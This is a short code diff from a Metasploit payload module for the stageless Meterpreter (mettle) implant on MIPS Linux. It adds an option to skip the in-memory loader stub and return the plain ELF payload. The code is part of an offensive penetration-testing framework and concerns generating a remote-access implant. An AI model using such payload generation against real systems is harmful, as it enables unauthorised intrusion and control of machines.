@@ -38,6 +38,10 @@ module MetasploitModule
       stageless: true
     }.merge(mettle_logging_config)
     payload = MetasploitPayloads::Mettle.new('mips-linux-muslsf', generate_config(opts)).to_binary :exec
-    in_memory_load(payload) + payload
+    ds = opts[:datastore] || datastore
+    unless ds['MeterpreterLegacyElf']
+      return in_memory_load(payload) + payload
+    end
+    payload
   end
 end
